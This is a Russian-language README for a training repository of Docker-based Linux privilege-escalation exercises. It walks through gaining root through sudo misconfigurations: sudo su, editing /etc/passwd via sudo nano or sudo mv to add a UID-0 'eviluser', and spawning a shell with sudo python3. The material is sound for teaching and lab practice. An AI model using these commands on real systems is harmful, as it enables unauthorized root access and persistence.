# Escalatoria
Этот репозиторий содержит набор упражнений по повышению привилегий в Linux
Репозиторий включает в себя УКАЗАТЬ ФИНАЛЬНОЕ КОЛИЧЕСЧТВО файлов для Docker,
из которых формируются уязвимые образы. Представлены упражнения по повышению привилегий
с использованием следующих техник:

* Повышение привилегий за счет неправильных настроек sudo
* Повышение привилегий за счет неправильно установленных suid для файлов
* Повышение привилегий за счет неправильно установленных capabilities для бинарных файлов
* Повышение привилегий через crontab
* Повышение привилегий через переменные окружения
***
### Получение репозитория
* Скопируйте репозиторий на свою машину командой
`git clone https://github.com/GeenStack/Escalatoria`
* Установите Docker
* Приступайте!
***
### Повышение привилегий за счет неправильных настроек sudo
***
###### 1. ДОСТУПНО ВСЕ!
В этом упражнении мы увидим, как опасна настройка sudo, при которой пользователю разрешено 
выполнение любых команд без пароля
1.  Перейдите в каталог abuse_sudo/nopasswd/ командой `cd abuse_sudo/nopasswd`
2.  Соберите уязвимый образ командой `docker build -t sudo_no_passwd .`
3.  Запустите контейнер из собранного образа и перейдите в его оболочку с помощью команды

    `docker run -it sudo_no_passwd /bin/bash`
4.  Итак, первое, с чего мы начинаем свое повышение привилегий - проверка наличия у текущего пользователя прав sudo. Выполните команду 
`sudo -l`

![sudo -l result](/pictures/pic1.png)

5.  Мы видим, что для пользователя escalator через sudo доступно выполнение любых команд от имени суперпользователя без ввода пароля, для повышения привилегий достаточно выполнить `sudo su`

![sudo su result](/pictures/pic2.png)

Это был достаточно легкий пример повышения привилегий. Попробуем что-то другое

***
###### 2. Приложения, выполняющиеся через sudo
###### 2.1 Приложения, которые могут осуществлять запись в файл
Теперь мы приступим к техникам повышения привилегий в том случае, когда нам доступно sudo на бинарные файлы, которые могут осуществлять запись в файл. Мы рассмотрим повышение привилегий через sudo на текстовый редактор nano и через sudo на команду mv

1.  Перейдите в каталог abuse_sudo/sudo_on_bin/write_file/abuse_nano
2.  Соберите уязвимый образ `docker build -t abuse_nano .`
3.  Запустите контейнер из собранного образа и перейдите в его оболочку с помощью команды

    `docker run -it abuse_nano /bin/bash`
4.  Выполните `sudo -l`

![sudo -l result](/pictures/pic3.png)

5.  Мы видим, что мы можем через sudo использовать nano, и редактировать файлы с правами root. 
Для повышения привилегий необходимо отредактировать файл /etc/passwd, создав своего пользователя с правами root. 
Таким образом также осуществляется закрепление в системе. Для этого необходимо проделать следующие шаги:
* На своем хосте сгенирируем хэш пароля evilpass для пользователя eviluser командой 

`openssl passwd -1 -salt eviluser evilpassword`

![generate password for eviluser](/pictures/pic4_1.png)

* Изменим внутри контейнера файл /etc/passwd используя nano `sudo nano /etc/passwd`. Добавим своего пользователя, добавив в конец файла строку: eviluser:$1$eviluser$eIaLEOmpQR3YjlJE1f/En.:0:0:/root/root:/bin/bash

![add eviluser](/pictures/pic5.png)

* Сохраним файл и откроем терминальную сессию для пользователя eviluser командой `su eviluser`, вводим пароль evilpassword. В итоге мы получаем сессию пользователя с правами root

![su eviluser](/pictures/pic6.png)

Теперь давайте попробуем повысить привилегии, используя sudo на команду mv
1.  Перейдите в каталог abuse_sudo/sudo_on_bin/write_file/abuse_mv
2.  Соберите уязвимый образ `docker build -t abuse_mv .`
3.  Запустите контейнер из собранного образа и перейдите в его оболочку с помощью команды

    `docker run -it abuse_mv /bin/bash`
4.  Выполните `sudo -l`

![sudo -l result](/pictures/pic7.png)

5. Мы видим, что нам доступно выполнение через sudo команды mv. Выстроим следующий вектор повышения привилегий: создадим копию файла /etc/passwd, добавим в нее своего пользователя с правами root, заменим с помощью команды mv оригинальный /etc/passwd нашей копией. Выполните следующие шаги:
* Выполните в контейнере команду `cp /etc/passwd passwd_copy`
* Внесите в passwd_copy строку eviluser:$1$eviluser$eIaLEOmpQR3YjlJE1f/En.:0:0:/root/root:/bin/bash
* Выполните команду `sudo mv passwd_copy /etc/passwd`
На скриншоте ниже продемонстрирован перезаписанный командой mv файл /etc/passwd

![sudo -l result](/pictures/pic8.png)

* Выполните команду `su eviluser`, вы получите сессию пользователя с правами root

###### 2.2 Приложения, которые могут вызвать shell

В некоторых случаях нам может быть доступно выполнение через sudo приложений, которые могут вызывать оболочу shell. Мы рассмторим примеры получения оболочки через интерпретаторы python, perl, а также вызов оболочки с помощью утилиты find.

1.  Перейдите в каталог abuse_sudo/sudo_on_bin/spawn_shell/shell_via_python
2.  Соберите уязвимый образ командой `docker build -t shell_via_python .`
3.  Запустите контейнер из собранного образа и перейдите в его оболочку с помощью команды

    `docker run -it shell_via_python /bin/bash`
    
4.  Результат команды `sudo -l` говорит нам о том, что нам доступно выполнение python3 от имени суперпользователя.
5.  Для повышения привилегий запустите python3 через sudo, импортируйте модуль pty, вызовите его метод spawn, передав ему аргумент '/bin/sh'. Вы можете также выполнить команду 
`sudo python3 -c "import pty; pty.spawn('/bin/sh')"`

На скриншоте ниже Вы можете наблюдать описаные процедуры для повышения привилегий:
![python escalation](/pictures/pic9.png)
